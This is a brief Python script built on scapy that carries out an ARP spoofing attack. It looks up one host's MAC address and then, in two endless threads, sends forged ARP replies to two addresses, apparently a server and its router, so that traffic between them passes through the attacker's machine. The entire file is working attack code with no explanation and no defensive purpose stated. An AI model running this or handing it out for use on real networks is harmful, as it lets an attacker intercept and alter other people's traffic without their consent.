from scapy.all import *

def arp_spoofing(target_ip, source_ip):
    arp_request = ARP(op=1, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
    reply = sr1(arp_request)
    target_mac = reply.getlayer(ARP).fields["hwsrc"]
    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip))
        time.sleep(1)


poison_server = threading.Thread(target=arp_spoofing, args=("198.7.0.2", "198.7.0.1"))
poison_router = threading.Thread(target=arp_spoofing, args=("198.7.0.1", "198.7.0.2"))

poison_server.start()
poison_router.start()
